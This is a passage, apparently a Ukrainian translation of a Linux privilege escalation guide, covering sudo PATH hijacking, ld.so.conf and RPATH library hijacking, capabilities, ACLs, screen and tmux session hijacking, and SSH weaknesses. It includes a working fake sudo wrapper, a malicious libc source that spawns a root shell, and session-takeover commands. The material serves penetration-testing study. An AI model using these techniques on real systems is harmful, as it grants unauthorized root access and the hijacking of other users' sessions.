—è–∫–æ—Å—Ç—ñ root, –∞ –ø–æ—Ç—ñ–º –∫–æ–º–∞–Ω–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ü–æ—Ç—ñ–º **–∑–º—ñ–Ω—ñ—Ç—å $PATH** –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–æ–¥–∞–≤—à–∏ –Ω–æ–≤–∏–π —à–ª—è—Ö —É .bash\_profile), —â–æ–± –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º sudo –≤–∏–∫–æ–Ω—É–≤–∞–≤—Å—è –≤–∞—à –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª sudo.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —ñ–Ω—à–∏–π –æ–±–æ–ª–æ–Ω–∫—É (–Ω–µ bash), –≤–∞–º –¥–æ–≤–µ–¥–µ—Ç—å—Å—è –∑–º—ñ–Ω–∏—Ç–∏ —ñ–Ω—à—ñ —Ñ–∞–π–ª–∏, —â–æ–± –¥–æ–¥–∞—Ç–∏ –Ω–æ–≤–∏–π —à–ª—è—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) –∑–º—ñ–Ω—é—î `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ —É [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

–ê–±–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‚Äòexport PATH=/tmp:$PATH‚Äô >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## –°–ø—ñ–ª—å–Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞

### ld.so

–§–∞–π–ª `/etc/ld.so.conf` –≤–∫–∞–∑—É—î **–∑–≤—ñ–¥–∫–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó**. –ó–∞–∑–≤–∏—á–∞–π, —Ü–µ–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—Å—Ç—É–ø–Ω–∏–π —à–ª—è—Ö: `include /etc/ld.so.conf.d/*.conf`

–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –±—É–¥—É—Ç—å –ø—Ä–æ—á–∏—Ç–∞–Ω—ñ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑ `/etc/ld.so.conf.d/*.conf`. –¶—ñ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó **–≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —ñ–Ω—à—ñ —Ç–µ–∫–∏**, –¥–µ –±—É–¥—É—Ç—å **—à—É–∫–∞—Ç–∏—Å—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–º—ñ—Å—Ç `/etc/ld.so.conf.d/libc.conf` - `/usr/local/lib`. **–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —Å–∏—Å—Ç–µ–º–∞ –±—É–¥–µ —à—É–∫–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `/usr/local/lib`**.

–Ø–∫—â–æ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å** –¥–æ –±—É–¥—å-—è–∫–æ–≥–æ –∑ –≤–∫–∞–∑–∞–Ω–∏—Ö —à–ª—è—Ö—ñ–≤: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, –±—É–¥—å-—è–∫–æ–≥–æ —Ñ–∞–π–ª—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `/etc/ld.so.conf.d/` –∞–±–æ –±—É–¥—å-—è–∫–æ—ó —Ç–µ–∫–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `/etc/ld.so.conf.d/*.conf`, –≤—ñ–Ω –º–æ–∂–µ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.\
–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ **—è–∫ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—é –ø–æ–º–∏–ª–∫—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó** –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
–ö–æ–ø—ñ—é—é—á–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –≤ `/var/tmp/flag15/`, –≤–æ–Ω–∞ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –ø—Ä–æ–≥—Ä–∞–º–æ—é –≤ —Ü—å–æ–º—É –º—ñ—Å—Ü—ñ, —è–∫ –≤–∫–∞–∑–∞–Ω–æ –≤ –∑–º—ñ–Ω–Ω—ñ–π `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
–¢–æ–¥—ñ —Å—Ç–≤–æ—Ä—ñ—Ç—å –∑–ª–æ–≤—ñ—Å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –≤ `/var/tmp` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## –í–º—ñ–Ω–Ω—è

–ú–æ–∂–ª–∏–≤–æ—Å—Ç—ñ Linux –Ω–∞–¥–∞—é—Ç—å **–ø—ñ–¥–º–Ω–æ–∂–∏–Ω—É –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ root –ø—Ä–æ—Ü–µ—Å—É**. –¶–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —Ä–æ–∑–±–∏–≤–∞—î –ø—Ä–∏–≤—ñ–ª–µ—ó root –Ω–∞ –º–µ–Ω—à—ñ —Ç–∞ –≤—ñ–¥–º—ñ–Ω–Ω—ñ –æ–¥–∏–Ω–∏—Ü—ñ. –ö–æ–∂–Ω—É –∑ —Ü–∏—Ö –æ–¥–∏–Ω–∏—Ü—å –º–æ–∂–Ω–∞ –Ω–∞–¥–∞–≤–∞—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∞–º –Ω–µ–∑–∞–ª–µ–∂–Ω–æ. –¢–∞–∫–∏–º —á–∏–Ω–æ–º –ø–æ–≤–Ω–∏–π –Ω–∞–±—ñ—Ä –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∑–º–µ–Ω—à—É—î—Ç—å—Å—è, –∑–º–µ–Ω—à—É—é—á–∏ —Ä–∏–∑–∏–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.\
–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ —è–∫ —ó—Ö –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## –î–æ–∑–≤–æ–ª–∏ –∫–∞—Ç–∞–ª–æ–≥—É

–£ –∫–∞—Ç–∞–ª–æ–∑—ñ **–±—ñ—Ç –¥–ª—è "–≤–∏–∫–æ–Ω–∞–Ω–Ω—è"** –æ–∑–Ω–∞—á–∞—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–∏–π —Å—Ç–æ—Å—É—î—Ç—å—Å—è, –º–æ–∂–µ "**cd**" —É –ø–∞–ø–∫—É.\
–ë—ñ—Ç **"—á–∏—Ç–∞–Ω–Ω—è"** –æ–∑–Ω–∞—á–∞—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ **–ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏** **—Ñ–∞–π–ª–∏**, –∞ –±—ñ—Ç **"–∑–∞–ø–∏—Å—É"** –æ–∑–Ω–∞—á–∞—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ **–≤–∏–¥–∞–ª—è—Ç–∏** —Ç–∞ **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏** –Ω–æ–≤—ñ **—Ñ–∞–π–ª–∏**.

## ACLs

–°–ø–∏—Å–∫–∏ –∫–µ—Ä—É–≤–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø–æ–º (ACL) –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç—å —Å–æ–±–æ—é –≤—Ç–æ—Ä–∏–Ω–Ω–∏–π —Ä—ñ–≤–µ–Ω—å —É–º–æ–≤–Ω–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤, –∑–¥–∞—Ç–Ω–∏—Ö **–ø–µ—Ä–µ–≤–∏—â—É–≤–∞—Ç–∏ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ ugo/rwx**. –¶—ñ –¥–æ–∑–≤–æ–ª–∏ –ø–æ–∫—Ä–∞—â—É—é—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ —Ñ–∞–π–ª—É –∞–±–æ –∫–∞—Ç–∞–ª–æ–≥—É, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∞–±–æ –≤—ñ–¥–º–æ–≤–ª—è—é—á–∏ –ø—Ä–∞–≤–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º, —è–∫—ñ –Ω–µ —î –≤–ª–∞—Å–Ω–∏–∫–∞–º–∏ –∞–±–æ —á–∞—Å—Ç–∏–Ω–æ—é –≥—Ä—É–ø–∏. –¶–µ–π —Ä—ñ–≤–µ–Ω—å **–¥–µ—Ç–∞–ª—ñ–∑–∞—Ü—ñ—ó –∑–∞–±–µ–∑–ø–µ—á—É—î –±—ñ–ª—å—à —Ç–æ—á–Ω–µ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –¥–æ—Å—Ç—É–ø–æ–º**. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [**—Ç—É—Ç**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**–ù–∞–¥–∞–π—Ç–µ** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ "kali" –ø—Ä–∞–≤–∞ –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è —Ç–∞ –∑–∞–ø–∏—Å —É —Ñ–∞–π–ª—ñ:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**–û—Ç—Ä–∏–º–∞—Ç–∏** —Ñ–∞–π–ª–∏ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º–∏ ACL –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## –í—ñ–¥–∫—Ä–∏—Ç—Ç—è –æ–±–æ–ª–æ–Ω–æ–∫

–£ **—Å—Ç–∞—Ä–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö** –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞—Ö–æ–ø–∏—Ç–∏** –¥–µ—è–∫—ñ **—Å–µ–∞–Ω—Å–∏ –æ–±–æ–ª–æ–Ω–∫–∏** —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (**root**).\
–£ **–Ω–æ–≤—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö** –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è** –ª–∏—à–µ –¥–æ —Å–µ–∞–Ω—Å—ñ–≤ –µ–∫—Ä–∞–Ω—É **–≤–ª–∞—Å–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –û–¥–Ω–∞–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ–∞–Ω—Å—É**.

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Å–µ–∞–Ω—Å—ñ–≤ –µ–∫—Ä–∞–Ω—É

**–ü–µ—Ä–µ–ª—ñ–∫ —Å–µ–∞–Ω—Å—ñ–≤ –µ–∫—Ä–∞–Ω—É**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**–ü—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è –¥–æ —Å–µ–∞–Ω—Å—É**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Å–µ–∞–Ω—Å—ñ–≤ tmux

–¶–µ –±—É–ª–∞ –ø—Ä–æ–±–ª–µ–º–∞ –∑ **—Å—Ç–∞—Ä–∏–º–∏ –≤–µ—Ä—Å—ñ—è–º–∏ tmux**. –Ø –Ω–µ –º—ñ–≥ –∑–∞—Ö–æ–ø–∏—Ç–∏ —Å–µ–∞–Ω—Å tmux (v2.1), —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º root —è–∫ –Ω–µ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á.

**–ü–µ—Ä–µ–ª—ñ–∫ —Å–µ–∞–Ω—Å—ñ–≤ tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**–ü—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è –¥–æ —Å–µ–∞–Ω—Å—É**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **Valentine box –≤—ñ–¥ HTB** –¥–ª—è –ø—Ä–∏–∫–ª–∞–¥—É.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

–£—Å—ñ –∫–ª—é—á—ñ SSL —Ç–∞ SSH, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –Ω–∞ —Å–∏—Å—Ç–µ–º–∞—Ö –Ω–∞ –æ—Å–Ω–æ–≤—ñ Debian (Ubuntu, Kubuntu —ñ —Ç. –¥.) –º—ñ–∂ –≤–µ—Ä–µ—Å–Ω–µ–º 2006 —Ä–æ–∫—É —Ç–∞ 13 —Ç—Ä–∞–≤–Ω—è 2008 —Ä–æ–∫—É –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–æ—à–∫–æ–¥–∂–µ–Ω—ñ —Ü–∏–º –±–∞–≥–æ–º.\
–¶–µ–π –±–∞–≥ –≤–∏–Ω–∏–∫–∞—î –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ ssh –∫–ª—é—á–∞ –≤ —Ü–∏—Ö –û–°, –æ—Å–∫—ñ–ª—å–∫–∏ **–º–æ–∂–ª–∏–≤—ñ –ª–∏—à–µ 32 768 –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤—Å—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –º–æ–∂–Ω–∞ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏, —ñ **–º–∞—é—á–∏ –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á ssh, –≤–∏ –º–æ–∂–µ—Ç–µ —à—É–∫–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á**. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ä–æ–∑—Ä–∞—Ö–æ–≤–∞–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Ç—É—Ç: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### –¶—ñ–∫–∞–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó SSH

* **PasswordAuthentication:** –í–∫–∞–∑—É—î, —á–∏ –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑–∞ –ø–∞—Ä–æ–ª–µ–º. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º - `no`.
* **PubkeyAuthentication:** –í–∫–∞–∑—É—î, —á–∏ –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑–∞ –ø—É–±–ª—ñ—á–Ω–∏–º –∫–ª—é—á–µ–º. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º - `yes`.
* **PermitEmptyPasswords**: –ö–æ–ª–∏ –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑–∞ –ø–∞—Ä–æ–ª–µ–º, –≤–∫–∞–∑—É—î, —á–∏ –¥–æ–∑–≤–æ–ª—è—î —Å–µ—Ä–≤–µ—Ä –≤—Ö—ñ–¥ –≤ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∑ –ø–æ—Ä–æ–∂–Ω—ñ–º–∏ —Ä—è–¥–∫–∞–º–∏ –ø–∞—Ä–æ–ª—é. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º - `no`.

### PermitRootLogin

–í–∫–∞–∑—É—î, —á–∏ –º–æ–∂–µ root —É–≤—ñ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é ssh, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º - `no`. –ú–æ–∂–ª–∏–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è:

* `yes`: root –º–æ–∂–µ —É–≤—ñ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–æ–ª—è —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞
* `without-password` –∞–±–æ `prohibit-password`: root –º–æ–∂–µ —É–≤—ñ–π—Ç–∏ –ª–∏—à–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞
* `forced-commands-only`: Root –º–æ–∂–µ —É–≤—ñ–π—Ç–∏ –ª–∏—à–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞, —è–∫—â–æ –≤–∫–∞–∑–∞–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∫–æ–º–∞–Ω–¥
* `no` : no

### AuthorizedKeysFile

–í–∫–∞–∑—É—î —Ñ–∞–π–ª–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å –ø—É–±–ª—ñ—á–Ω—ñ –∫–ª—é—á—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –í—ñ–Ω –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ —Ç–æ–∫–µ–Ω–∏, —Ç–∞–∫—ñ —è–∫ `%h`, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–º—ñ–Ω–µ–Ω—ñ –Ω–∞ –¥–æ–º–∞—à–Ω—ñ–π –∫–∞—Ç–∞–ª–æ–≥. **–í–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –∞–±—Å–æ–ª—é—Ç–Ω—ñ —à–ª—è—Ö–∏** (–ø–æ—á–∏–Ω–∞—é—á–∏ –∑ `/`) –∞–±–æ **–≤—ñ–¥–Ω–æ—Å–Ω—ñ —à–ª—è—Ö–∏ –≤—ñ–¥ –¥–æ–º–∞—à–Ω—å–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
–¢–∞–∫–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –ø–æ–∫–∞–∂–µ, —â–æ —è–∫—â–æ –≤–∏ —Å–ø—Ä–æ–±—É—î—Ç–µ —É–≤—ñ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ** –∫–ª—é—á–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ "**testusername**", ssh –ø–æ—Ä—ñ–≤–Ω—è—î –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á –≤–∞—à–æ–≥–æ –∫–ª—é—á–∞ –∑ —Ç–∏–º–∏, —â–æ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ `/home/testusername/.ssh/authorized_keys` —Ç–∞ `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

–ü–µ—Ä–µ—Å–∏–ª–∞–Ω–Ω—è SSH –∞–≥–µ–Ω—Ç–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–∞—à—ñ –ª–æ–∫–∞–ª—å–Ω—ñ SSH –∫–ª—é—á—ñ –∑–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –∑–∞–ª–∏—à–∞—Ç–∏ –∫–ª—é—á—ñ** (–±–µ–∑ –ø–∞—Ä–æ–ª—ñ–≤!) –Ω–∞ –≤–∞—à–æ–º—É —Å–µ—Ä–≤–µ—Ä—ñ. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–π—Ç–∏** —á–µ—Ä–µ–∑ ssh **–Ω–∞ —Ö–æ—Å—Ç** —ñ –∑–≤—ñ–¥—Ç–∏ **–ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ —ñ–Ω—à–∏–π** —Ö–æ—Å—Ç, **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏** –∫–ª—é—á, —â–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ –≤–∞—à–æ–º—É **–ø–æ—á–∞—Ç–∫–æ–≤–æ–º—É —Ö–æ—Å—Ç—ñ**.

–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ü—é –æ–ø—Ü—ñ—é –≤ `$HOME/.ssh.config` —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```
Host example.com
ForwardAgent yes
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ `Host` - —Ü–µ `*`, –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –Ω–∞ —ñ–Ω—à—É –º–∞—à–∏–Ω—É, —Ü—è –º–∞—à–∏–Ω–∞ –∑–º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫–ª—é—á—ñ–≤ (—â–æ —î –ø—Ä–æ–±–ª–µ–º–æ—é –±–µ–∑–ø–µ–∫–∏).

–§–∞–π–ª `/etc/ssh_config` –º–æ–∂–µ **–ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–∏—Ç–∏** —Ü—ñ **–æ–ø—Ü—ñ—ó** —Ç–∞ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∞–±–æ –∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏ —Ü—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é.\
–§–∞–π–ª `/etc/sshd_config` –º–æ–∂–µ **–¥–æ–∑–≤–æ–ª–∏—Ç–∏** –∞–±–æ **–∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏** –ø–µ—Ä–µ—Å–∏–ª–∞–Ω–Ω—è ssh-–∞–≥–µ–Ω—Ç–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–æ–≤–æ–≥–æ —Å–ª–æ–≤–∞ `AllowAgentForwarding` (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º - –¥–æ–∑–≤–æ–ª–µ–Ω–æ).

